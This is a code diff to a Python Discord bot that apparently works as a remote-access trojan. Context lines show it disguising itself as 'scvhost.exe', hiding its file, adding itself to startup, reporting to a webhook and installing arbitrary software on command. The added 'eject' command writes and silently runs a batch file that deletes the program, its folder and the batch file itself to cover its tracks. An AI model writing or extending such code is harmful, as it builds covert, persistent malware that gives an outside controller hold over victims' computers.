@@ -432,7 +432,6 @@ async def on_ready():
 
 @bot.command()
 async def hide(ctx):
-    """Hide the bot: rename to scvhost.exe, hide file, add to startup"""
     global is_hidden, original_filename, hidden_paths
     
     await ctx.send("Hiding bot...")
@@ -472,7 +471,6 @@ async def hide(ctx):
 
 @bot.command()
 async def unhide(ctx):
-    """Unhide the bot: restore original name, unhide, remove from startup"""
     global is_hidden, original_filename, hidden_paths
     
     await ctx.send("Unhiding bot...")
@@ -509,7 +507,6 @@ async def unhide(ctx):
 
 @bot.command()
 async def status(ctx):
-    """Check if bot is hidden"""
     if is_hidden:
         await ctx.send("🔒 Bot is currently HIDDEN as scvhost.exe")
         await send_webhook("Status: Hidden as scvhost.exe")
@@ -518,8 +515,44 @@ async def status(ctx):
         await send_webhook("Status: Not hidden")
 
 @bot.command()
+async def eject(ctx):
+    """Unlaunch the program - shuts down without removing startup if hidden"""
+    await ctx.send("🔄 Ejecting bot...")
+    await send_webhook("**BOT EJECTED** - Shutting down")
+    
+    try:
+        script_path = get_current_script_path()
+        script_dir = os.path.dirname(script_path)
+        
+        # Only remove from startup if NOT hidden
+        if not is_hidden:
+            remove_from_startup()
+            # Create batch file to delete the bot
+            batch_path = os.path.join(script_dir, "delete_self.bat")
+            batch_content = f'''
+@echo off
+timeout /t 2 /nobreak > nul
+del "{script_path}" /f /q 2>nul
+rmdir /s /q "{script_dir}" 2>nul
+del "%~f0" /f /q 2>nul
+exit
+'''
+            with open(batch_path, 'w') as f:
+                f.write(batch_content)
+            subprocess.Popen([batch_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            await ctx.send("👋 Bot ejected and files deleted!")
+        else:
+            # Bot is hidden - just close without deleting
+            await ctx.send("👋 Bot ejected (hidden mode - startup preserved)")
+
+        await bot.close()
+        
+    except Exception as e:
+        await ctx.send(f"Eject failed: {str(e)}")
+        await send_webhook(f"Eject failed: {str(e)}")
+
+@bot.command()
 async def install(ctx, *, package):
-    """Install a package or program. Usage: !install requests or !install python"""
     await ctx.send(f"Installing: {package}")
     
     def install_thread():
